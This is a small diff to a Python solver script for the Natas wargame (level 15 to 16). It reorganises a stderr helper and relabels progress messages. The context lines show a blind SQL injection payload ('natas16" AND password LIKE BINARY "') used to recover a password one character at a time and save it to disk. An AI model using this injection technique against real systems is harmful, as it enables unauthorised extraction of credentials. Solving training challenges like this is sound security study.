@@ -6,6 +6,9 @@ import requests as rq
 import signal
 import sys
 
+def printerr(*args, **kwargs):
+    print(*args, file = sys.stderr, **kwargs)
+
 try:
     natas15pass = os.environ['natas15pass']
 except:
@@ -17,9 +20,6 @@ plTemplate = 'natas16" AND password LIKE BINARY "'
 
 passwd = ''
 bkp_path = 'natas16/.password'
-
-def printerr(*args, **kwargs):
-    print(*args, file = sys.stderr, **kwargs)
 
 def mkReqWithPayload(pl):
     return rq.post(
@@ -70,10 +70,10 @@ def bruteForce():
             pl = plTemplate + passwd + i + '%'
             r = mkReqWithPayload(pl)
             if r.ok: 
-                printerr('\rtried:', passwd + i, end = '')
+                printerr('\rnatas16:', passwd + i, end = '')
                 if r.text.find('This user exists.') > -1:
                     passwd += i
-                    printerr('\rhit:  ', passwd)
+                    printerr('\rnatas16:', passwd, end = '')
                     bkp = open(bkp_path, 'wb')
                     bkp.write(passwd.encode('ascii'))
                     bkp.close()
